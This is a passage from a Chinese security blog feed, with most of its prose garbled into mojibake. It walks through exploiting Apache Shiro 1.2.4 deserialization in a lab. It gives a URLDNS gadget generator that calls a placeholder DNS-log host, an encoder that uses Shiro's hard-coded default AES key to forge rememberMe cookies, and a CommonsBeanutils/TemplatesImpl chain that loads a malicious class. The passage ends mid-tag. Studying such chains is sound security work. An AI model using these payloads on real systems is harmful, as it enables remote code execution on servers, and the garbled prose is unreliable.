id="8u20ä¿®å¤"><a href="#8u20ä¿®å¤" class="headerlink" title="8u20ä¿®å¤"></a>8u20ä¿®å¤</h2><h3 id="jdk7"><a href="#jdk7" class="headerlink" title="jdk7"></a>jdk7</h3><p>jdk7u80 getMemberMethods()å¢åŠ äº†å¯¹memberMethodsç”¨validateAnnotationMethodå‡½æ•°è¿›è¡ŒéªŒè¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jdk7_80  sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.memberMethods = (Method[])AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.<span class="built_in">this</span>.type.getDeclaredMethods();</span><br><span class="line">                <span class="comment">// è¿™é‡Œçš„  var1 æ˜¯ newTransformer å’Œ getOutputProperties</span></span><br><span class="line">                AnnotationInvocationHandler.<span class="built_in">this</span>.validateAnnotationMethods(var1); <span class="comment">// å¢åŠ äº†è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">                AccessibleObject.setAccessible(var1, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> var1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.memberMethods;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jdk8u191 æŠŠdefaultReadObjectä¿®æ”¹ä¸ºäº†readFields();ï¼Œå› ä¸ºæŠ›å‡ºå¼‚å¸¸æå‰é€€å‡ºreadObjectä¸å†èƒ½é¡ºåˆ©åºåˆ—åŒ–å­—æ®µä¸­çš„å¯¹è±¡äº†ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240918220533201.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240918220533201.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœçœ‹ä¸æ‡‚ï¼Œå‚è€ƒæ–‡ç« 1å¾ˆç»†è‡´</p><p>7u21å‚è€ƒæ–‡ç« :</p><p>å®¸æå®éªŒå®¤â€”ã€ä»£ç å®¡è®¡ã€ysoserial Jdk7u21 ååºåˆ—åŒ–æ¼æ´åˆ†æ</p><p><a href="https://zhuanlan.zhihu.com/p/639541505">https://zhuanlan.zhihu.com/p/639541505</a></p><p>ä¿®å¤æ–¹æ¡ˆ</p><p><a href="https://cloud.tencent.com/developer/article/2204427">https://cloud.tencent.com/developer/article/2204427</a></p><p>8u20 å‚è€ƒæ–‡ç« :</p><p><a href="https://cloud.tencent.com/developer/article/2204437">https://cloud.tencent.com/developer/article/2204437</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> otheræ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaåŸç”ŸRCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro550 URLDNS&amp;CC&amp;CBæ”»å‡»</title>
      <link href="/2024/08/06/shiro-fan-xu-lie-hua-shen-ji/"/>
      <url>/2024/08/06/shiro-fan-xu-lie-hua-shen-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h1><h2 id="ç¯å¢ƒæ­å»ºï¼š"><a href="#ç¯å¢ƒæ­å»ºï¼š" class="headerlink" title="ç¯å¢ƒæ­å»ºï¼š"></a>ç¯å¢ƒæ­å»ºï¼š</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/apache/shiro.git</span></span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-<span class="number">1.2</span><span class="number">.4</span> <span class="comment">//åˆ‡æ¢åˆ°1.2.4ç‰ˆæœ¬</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹samples&#x2F;web&#x2F;pom.xml jstlä¾èµ–ä¸º1.2ï¼Œå¦åˆ™jspè§£ææŠ¥é”™</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803175529287.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803175529287.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¿®æ”¹æ’ä»¶æ¥æº</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803175502977.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803175502977.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é…ç½®Tomcatè§ï¼š</p><p><a href="https://blog.csdn.net/qq_44769520/article/details/123476443">https://blog.csdn.net/qq_44769520/article/details/123476443</a></p><p>å»ºè®®ä¸‹8ç‰ˆæœ¬8.5.56 zip</p><p><a href="https://archive.apache.org/dist/tomcat/tomcat-8/">https://archive.apache.org/dist/tomcat/tomcat-8/</a></p><p>è§£å‹åIDEAç¼–è¾‘é…ç½®ï¼Œé€‰æ‹©Tomcatæœ¬åœ°ï¼Œè¿è¡Œå³å¯ã€‚è¿è¡Œåè®¿é—®ä¸»é¡µå¦‚ä¸‹ï¼š</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240805113952439.png" class="lazyload placeholder" data-srcset="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240805113952439.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>éœ€è¦è°ƒè¯•Tomcatçš„ï¼ŒæŠŠTomcatä¸‹çš„libåº“å¯¼å…¥é¡¹ç›®åº“</p><p>Shiro 550çš„åŸç†æˆ‘å°±ä¸å†é‡å¤å¤šåˆ†æäº†</p><p>ç®€å•è¯´æ¥å°±æ˜¯ï¼šåºåˆ—åŒ–å­—èŠ‚ç -&gt;å›ºå®šå¯†é’¥AESåŠ å¯†-&gt;base64ç¼–ç -&gt;POSTæ•°æ®-&gt;ååºåˆ—åŒ–</p><p>æ„Ÿå…´è¶£çš„å»org.apache.shiro.web.mgt.CookieRememberMeManageråˆ†æã€‚</p><p>ç»™ä¸€ä¸ªæ ˆå›¾ï¼Œåœ¨OncePerRequestFilterçš„doFilterå¤„ç†è¯·æ±‚ï¼Œåœ¨CookieRemberMeManagerç”Ÿæˆcookieå’Œå¤„ç†cookieã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805154744315.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805154744315.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç€é‡çœ‹ä¸‹åˆ©ç”¨</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNSä¸éœ€è¦ä¾èµ–ï¼Œç›´æ¥ç›²æ‰“ä»¥æ¢æµ‹æ¼æ´ã€‚</p><p>å¦å¤–èµ·ä¸€ä¸ªé¡¹ç›®æ¨¡æ‹Ÿæ”»å‡»ç¯å¢ƒï¼Œä¸‹ä¸€ä¸ªshiro1.2.4çš„åº“ï¼Œpomé‡Œè‡ªè¡Œæ·»åŠ dependency</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805161830522.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805161830522.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>URLDNSç”Ÿæˆå­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://yourdnslog&quot;</span>);</span><br><span class="line"><span class="comment">//        url.hashCode();</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">0</span>);</span><br><span class="line">        map.put(url,<span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(map);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯¹å­—èŠ‚ç ç¼–ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroEncode550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\ser.bin&quot;</span>));</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸€ä¸ªåŸŸååªèƒ½ç”¨ä¸€æ¬¡ï¼Œæ¯”å¦‚ä½ çš„åŸŸåä¸ºivtfbe.dnslog.cnï¼Œå¯ä»¥ç¬¬ä¸€ä¸ªåŒ…å‘1.ivtfbe.dnslog.cnï¼Œç¬¬äºŒä¸ªå‘2.ivtfbe.dnslog.cn</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805171035575.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805171035575.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç›²æ‰“æˆåŠŸï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805162346628.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805162346628.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="Commons-collections"><a href="#Commons-collections" class="headerlink" title="Commons-collections"></a>Commons-collections</h2><p>å°½ç®¡æˆ‘ä»¬åœ¨ä¾èµ–åº“çœ‹åˆ°äº†commons-collections:3.2.1çš„ä¾èµ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803190638939.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803190638939.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨mavenä¾èµ–é‡å¤æŒ‰ctrl+â€+â€å…¨éƒ¨å±•å¼€ï¼Œæœç´¢æ‰¾åˆ°commons-collectionsçš„ä¾èµ–ã€‚ä½†æ˜¯æ ‡æ³¨äº†ä¸ºtest</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805174000684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240805174000684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>ä¾èµ–åŒ…æœ‰ä¾èµ–èŒƒå›´ï¼Œåœ¨pom.xml <code>&lt;dependencies&gt;</code>æ ‡ç­¾ä¸‹æœ‰<code>&lt;scope&gt;</code>ä¾èµ–èŒƒå›´å£°æ˜ã€‚æ²¡æœ‰çš„é»˜è®¤å€¼ä¸ºcompile</p><p>compile: è¡¨ç¤ºä¾èµ–åº“å°†è¢«åŒ…å«åœ¨ç¼–è¯‘ã€æµ‹è¯•å’Œè¿è¡Œæ—¶ç¯å¢ƒä¸­ã€‚<br>test: è¡¨ç¤ºä¾èµ–åº“ä»…åœ¨æµ‹è¯•é˜¶æ®µä½¿ç”¨ï¼Œä¸ä¼šè¢«æ‰“åŒ…åˆ°æœ€ç»ˆçš„åº”ç”¨ç¨‹åºä¸­ã€‚<br>provided: ç±»ä¼¼äºtestï¼Œä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼ˆå¦‚Webåº”ç”¨æœåŠ¡å™¨æä¾›çš„ç±»åº“ï¼‰ï¼Œè¯¥ä¾èµ–åœ¨è¿è¡Œæ—¶ç¯å¢ƒä¸­æ˜¯å¯é€‰çš„ã€‚<br>runtime: è¡¨ç¤ºä¾èµ–åº“åœ¨è¿è¡Œæ—¶éœ€è¦ï¼Œä½†ä¸éœ€è¦åœ¨ç¼–è¯‘æ—¶å­˜åœ¨ã€‚<br>system: ç±»ä¼¼äºprovidedï¼Œä½†æ˜¯éœ€è¦æ˜¾å¼åœ°æä¾›ä¸€ä¸ªç³»ç»Ÿè·¯å¾„æŒ‡å‘ä¾èµ–åº“ã€‚</p></blockquote><p>é‚£æˆ‘ä»¬å°±ç®—æ‰¾åˆ°äº†ååºåˆ—åŒ–å…¥å£ï¼Œæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ</p><p>ysoserialç»™å‡ºçš„æ˜¯commons-beanutilsã€‚ä¸”ä¸ºcompileä¾èµ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803191001874.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240803191001874.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é—®é¢˜å‡ºåœ¨è¯¥åº“ä¸‹çš„PropertyUtils.getProperty()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806170911541.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806170911541.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>PropertyUtils.getPropertyç”¨äºè·å–å±æ€§å€¼ã€‚æ¯”å¦‚ä¸€ä¸ªç¬¦åˆjavabeanè§„èŒƒçš„Personä¸‹æœ‰ageå±æ€§ã€‚å¦‚ä¸‹ä»£ç èƒ½è·å–ageå€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">PropertyUtils.getProperty(person,<span class="string">&quot;age&quot;</span>);</span><br></pre></td></tr></table></figure><p>é‚£æ˜¯æ€ä¹ˆè·å–åˆ°çš„å‘¢ï¼Ÿ</p><blockquote><p>ä¸‹é¢æ˜¯ä¸€äº› JavaBean è§„èŒƒçš„åŸºæœ¬è¦æ±‚ï¼š</p><ol><li><p>å…¬å…±ç±»ï¼š<br> JavaBean å¿…é¡»æ˜¯ä¸€ä¸ªå…¬å…±ç±»ï¼Œå³ç±»å£°æ˜å‰å¿…é¡»æœ‰ public å…³é”®å­—ã€‚</p></li><li><p>æ— å‚æ„é€ å™¨ï¼š<br> JavaBean å¿…é¡»æœ‰ä¸€ä¸ªæ— å‚çš„å…¬å…±æ„é€ å™¨ã€‚</p></li><li><p>ç§æœ‰æˆå‘˜å˜é‡ï¼š<br> JavaBean çš„æˆå‘˜å˜é‡åº”è¯¥æ˜¯ç§æœ‰çš„ï¼Œä»¥ç¡®ä¿å°è£…ã€‚</p></li><li><p>å±æ€§çš„ getter å’Œ setter æ–¹æ³•ï¼š<br> æ¯ä¸ªæˆå‘˜å˜é‡éƒ½åº”è¯¥æœ‰ä¸€ä¸ªå¯¹åº”çš„ getter å’Œ setter æ–¹æ³•ã€‚<br> getter æ–¹æ³•é€šå¸¸å‘½åä¸º get&lt;PropertyName&gt;ï¼Œsetter æ–¹æ³•é€šå¸¸å‘½åä¸º set&lt;PropertyName&gt;ã€‚<br> ç¤ºä¾‹ï¼š<code>public String getName() &#123; return name; &#125;</code></p></li></ol><p>  <code>public void setName(String name) &#123; this.name = name; &#125;</code></p><ol start="5"><li><p>åºåˆ—åŒ–ï¼š<br> JavaBean é€šå¸¸éœ€è¦å®ç° Serializable æ¥å£ï¼Œä»¥ä¾¿èƒ½å¤Ÿå°† JavaBean å¯¹è±¡çš„çŠ¶æ€ä¿å­˜åˆ°æ–‡ä»¶ä¸­æˆ–åœ¨ç½‘ç»œä¸Šä¼ è¾“ã€‚</p></li><li><p>å‘½åçº¦å®šï¼š<br> å±æ€§ååº”ç¬¦åˆ Java çš„å‘½åè§„åˆ™ï¼Œé€šå¸¸ä½¿ç”¨é©¼å³°å¼å‘½åæ³•ã€‚<br> å¦‚æœå±æ€§åä»¥ â€œisâ€ å¼€å¤´ï¼Œåˆ™ getter æ–¹æ³•å¯ä»¥çœç•¥ â€œgetâ€ å‰ç¼€ï¼Œç›´æ¥ä½¿ç”¨ is&lt;PropertyName&gt;ã€‚<br> ç¤ºä¾‹ï¼špublic boolean isMarried() { return married; }</p></li></ol></blockquote><p>getPropertyä¼ å…¥çš„å¿…é¡»æ˜¯ä¸ªjavabeanï¼Œå±æ€§è¦æœ‰å¯¹åº”çš„getterï¼Œsetterã€‚å®é™…ä¸ŠgetPropertyå°±æ˜¯è°ƒç”¨äº†å±æ€§çš„getteræ–¹æ³•ã€‚</p><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>é“¾å¼è°ƒç”¨åˆ°PropertyUtilsBean.getNestedPropertyï¼š</p><p>beanä¸æ˜¯Mapå­ç±»ï¼Œä¸”æŸ¥è¯¢çš„nameä¸æ˜¯mapå’Œç´¢å¼•æ—¶ï¼Œä¼šè°ƒç”¨åˆ°getSimplePropertyï¼ˆåŒ…ä¸æ˜¯çš„ï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806171105817.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806171105817.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>getSimplePropertyä¸­ï¼Œè·å–äº†å¯¹åº”çš„getteræ–¹æ³•ï¼Œå¹¶åå°„è°ƒç”¨ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806172225153.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806172225153.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è€Œä¸”å‰é¢æ ¹æœ¬æ²¡æœ‰åˆ¤æ–­ï¼ä¹Ÿå°±æ˜¯è¯´ä¸ç®¡ä½ getterå¯¹åº”çš„nameæ˜¯å¦å­˜åœ¨ï¼Œç±»æ˜¯å¦ç¬¦åˆjavaBeançš„è§„èŒƒä¸€æ¦‚ä¸åˆ¤æ–­ï¼Œåªè¦æœ‰ç¬¦åˆgetterå‘½åè§„èŒƒçš„æ–¹æ³•ï¼ŒgetReadMethodå°±èƒ½æ‰¾åˆ°æ–¹æ³•ï¼Œå°±èƒ½è¿›è¡Œè°ƒç”¨ã€‚</p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>æ—¢ç„¶èƒ½è°ƒç”¨é™¤Mapå­ç±»å¤–ä»»æ„ç±»ç¬¦åˆgetterå‘½åçš„æ–¹æ³•ã€‚TemplatesImplä¸‹çš„getOutputPropertieså°±éå¸¸ç¬¦åˆæ¡ä»¶äº†ã€‚é¡ºåˆ©è°ƒç”¨åˆ°newTransformer()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806173137478.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806173137478.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬åœ¨æ”»å‡»ç¯å¢ƒåŠ ä¸Šå¦‚ä¸‹ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è§¦å‘getOutputPropertiesä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">    <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">            field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">            field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">            field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    PropertyUtils.getProperty(templatesClass, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£æ€ä¹ˆè°ƒç”¨getPropertyå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªç±»ä¼¼TransformingComparator.compareçš„è§¦å‘ç‚¹ï¼Œåœ¨BeanComparator.compareã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806174420332.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806174420332.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>propertyç”¨æ„é€ å‡½æ•°ä¼ å…¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175442174.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240806175442174.png" 